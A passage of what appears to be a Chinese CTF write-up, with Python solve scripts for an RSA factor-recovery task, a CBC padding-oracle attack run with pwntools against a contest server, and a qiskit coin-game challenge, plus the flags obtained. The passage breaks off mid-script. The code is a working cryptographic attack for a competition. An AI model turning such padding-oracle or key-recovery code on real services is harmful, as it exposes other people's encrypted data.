punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                                <span class=\"token keyword\">if</span> temp1 <span class=\"token operator\">==</span> n_lowbits <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                                    <span class=\"token keyword\">if</span> n_highbits<span class=\"token operator\">-</span>temp2 <span class=\"token operator\">>=</span> <span class=\"token number\">0</span>  <span class=\"token keyword\">and</span> n_highbits<span class=\"token operator\">-</span>temp2 <span class=\"token operator\">&lt;=</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">&lt;&lt;</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                                        <span class=\"token comment\">#print(\"down\")</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                                        tmppp_low<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>pp_low <span class=\"token operator\">*</span> maskn <span class=\"token operator\">//</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> p_low<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                                        tmpqq_low<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>qq_low <span class=\"token operator\">*</span> maskn <span class=\"token operator\">//</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> q_low<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                                        tmppp_high<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>pp_high<span class=\"token operator\">&lt;&lt;</span><span class=\"token punctuation\">(</span><span class=\"token number\">511</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p_high<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                                        tmpqq_high<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>qq_high<span class=\"token operator\">&lt;&lt;</span><span class=\"token punctuation\">(</span><span class=\"token number\">511</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>q_high<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                                        <span class=\"token comment\">#print(tmppp_low)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                                        <span class=\"token comment\">#print(tmpqq_low)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                                        <span class=\"token comment\">#print(tmppp_high)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                                        <span class=\"token comment\">#print(tmpqq_high)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        maskn <span class=\"token operator\">*=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        maskx <span class=\"token operator\">*=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        p_low <span class=\"token operator\">=</span> tmppp_low</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        q_low <span class=\"token operator\">=</span> tmpqq_low</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        p_high <span class=\"token operator\">=</span> tmppp_high</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        q_high <span class=\"token operator\">=</span> tmpqq_high</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p_low<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">for</span> a <span class=\"token keyword\">in</span> p_low<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">for</span> b <span class=\"token keyword\">in</span> p_high<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            <span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">+</span>b<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>                p <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> b</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">,</span>q</pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    n <span class=\"token operator\">=</span> <span class=\"token number\">142640215238537871365683719891541306935180737226071087966538112975312943506714964164341655541156886519552359173518384366335764339838818638439617545046906731685628758140658162759582216079833807742803333237267119228131836589616600586722503125595590784393805677472708123448256012705645099262323873911736910168311</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    c <span class=\"token operator\">=</span> <span class=\"token number\">141992115210477059329798383810995602331919683555539663737474122431362785313684902184569357178889736223104558359787247242121836892146092641430333220915928891299001128364434856756544237628623127350186698031711524123158225428351095110283324920060240308834304841350657100420648385312630518518518978998617676378512</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    e <span class=\"token operator\">=</span> <span class=\"token number\">0x10001</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    x <span class=\"token operator\">=</span> <span class=\"token number\">2687108833541074884027968939992825896836389810177573543799115292760866858835988113613745599976930175463756036625174575759254321939315015594803646458939874</span> </pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    p <span class=\"token punctuation\">,</span> q <span class=\"token operator\">=</span> get_p_q<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    flag <span class=\"token operator\">=</span> get_flag<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><code>miniLCTF&#123;reverse_1s_als0_e1sy&#125;'</code></p>\n<h2 id=\"standard\"><a class=\"anchor\" href=\"#standard\">#</a> standard</h2>\n<p>原来那道题... 想的是用 base64 去爆破大概的每位是啥... 但是发现出的是 32 位哈希值 没法爆破，浪费了好一会时间... Padding Oracle... 细节真难调...</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> base64 <span class=\"token keyword\">import</span> b64decode<span class=\"token punctuation\">,</span> b64encode</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> long_to_bytes</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_least_length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        guess <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x00'</span> <span class=\"token operator\">*</span> i</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        c <span class=\"token operator\">=</span> b64decode<span class=\"token punctuation\">(</span>get_recv<span class=\"token punctuation\">(</span>guess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            base <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> base<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">return</span> base <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">-</span> i</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_recv</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b':'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>b64encode<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    Res <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'flag;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">return</span> Res<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_message_last</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    guess <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token number\">66</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">239</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        G <span class=\"token operator\">=</span> guess <span class=\"token operator\">+</span> long_to_bytes<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b':'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>b64encode<span class=\"token punctuation\">(</span>G <span class=\"token operator\">+</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b':'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>b64encode<span class=\"token punctuation\">(</span>IV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        resp <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'flag;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">if</span> resp <span class=\"token operator\">==</span> <span class=\"token string\">''</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token keyword\">return</span> i</pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    IV <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    LengTh <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    ciphertext <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    M <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span><span class=\"token number\">17</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">while</span> LengTh <span class=\"token operator\">==</span> <span class=\"token boolean\">None</span> <span class=\"token keyword\">or</span> LengTh <span class=\"token operator\">!=</span> <span class=\"token number\">17</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            io <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.archive.xdsec.chall.frankli.site'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10088</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            LengTh <span class=\"token operator\">=</span> get_least_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>LengTh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            io<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Get Length!!!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        pad <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x76'</span> <span class=\"token operator\">*</span> <span class=\"token number\">16</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">15</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token string\">b'\\x00'</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        res <span class=\"token operator\">=</span> get_recv<span class=\"token punctuation\">(</span>pad<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        ciphertext<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>b64decode<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Get Ciphertext!!!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> ciphertext<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            c16 <span class=\"token operator\">=</span> c<span class=\"token punctuation\">[</span><span class=\"token number\">48</span><span class=\"token punctuation\">:</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>            M<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>get_message_last<span class=\"token punctuation\">(</span>c16<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> c<span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        c16 <span class=\"token operator\">=</span> c<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">:</span><span class=\"token number\">48</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        M<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>get_message_last<span class=\"token punctuation\">(</span>c16<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> c<span class=\"token punctuation\">[</span><span class=\"token number\">31</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    m <span class=\"token operator\">=</span> <span class=\"token string\">b''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>M<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Get Message!!!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>b64encode<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/1111111.png\" alt=\"\" /></p>\n<p><code>xdsec&#123;f3e2f3fd-afd1-4e02-90ed-d02e9cd4caba&#125;</code></p>\n<h2 id=\"土块\"><a class=\"anchor\" href=\"#土块\">#</a> 土块</h2>\n<p>把题目中的 <code>game</code>  函数拿出来研究，如下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> tukuai <span class=\"token keyword\">import</span> game</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>cheat<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>init_state <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>coin1 <span class=\"token operator\">=</span> randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>coin2 <span class=\"token operator\">=</span> randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>temp <span class=\"token operator\">=</span> coin1 <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> coin2</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>init_state<span class=\"token punctuation\">[</span>temp<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>servercoin<span class=\"token punctuation\">,</span>qc <span class=\"token operator\">=</span> game<span class=\"token punctuation\">(</span>cheat<span class=\"token punctuation\">,</span> init_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>coin1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>coin2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>init_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'my coin is '</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>servercoin<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">' your coin is?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">from</span> qiskit<span class=\"token punctuation\">.</span>tools<span class=\"token punctuation\">.</span>visualization <span class=\"token keyword\">import</span> plot_bloch_multivector</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>display<span class=\"token punctuation\">(</span>plot_bloch_multivector<span class=\"token punctuation\">(</span>init_state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>simulator<span class=\"token operator\">=</span>Aer<span class=\"token punctuation\">.</span>get_backend<span class=\"token punctuation\">(</span><span class=\"token string\">'qasm_simulator'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>result<span class=\"token operator\">=</span>execute<span class=\"token punctuation\">(</span>qc<span class=\"token punctuation\">,</span>backend<span class=\"token operator\">=</span>simulator<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>result<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">from</span> qiskit<span class=\"token punctuation\">.</span>tools<span class=\"token punctuation\">.</span>visualization <span class=\"token keyword\">import</span> plot_histogram</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>display<span class=\"token punctuation\">(</span>qc<span class=\"token punctuation\">.</span>draw<span class=\"token punctuation\">(</span>output<span class=\"token operator\">=</span><span class=\"token string\">'mpl'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>display<span class=\"token punctuation\">(</span>plot_histogram<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span>get_counts<span class=\"token punctuation\">(</span>qc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>画出几个图出来看看，只要绘出 bot 的输出 = my coin 的量子电路即可，如下</p>\n<pre><code>       ┌──────────────────────┐┌───┐        \nq12_0: ┤0                     ├┤ X ├──■─────\n       │  initialize(0,0,1,0) │└─┬─┘┌─┴─┐┌─┐\nq12_1: ┤1                     ├──■──┤ X ├┤M├\n       └──────────────────────┘     └───┘└╥┘\n c1: 1/═══════════════════════════════════╩═\n                                          0 \n</code></pre>\n<p>qubits..... 量子计算学习.... 量子通信～<span class=\"exturl\" data-url=\"aHR0cHM6Ly9xaXNraXQub3JnL3RleHRib29rL3ByZWZhY2UuaHRtbCVFNyVCRiVCQiVFNSVBRSU5OCVFNiU5NiVCOSVFNiU5NiU4NyVFNiVBMSVBMw==\">https://qiskit.org/textbook/preface.html 翻官方文档</span> 复制让 01 输出 01，10 输出 10 巧！</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Rec <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>  <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Sen <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x<span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>RecUntil <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x<span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>x<span 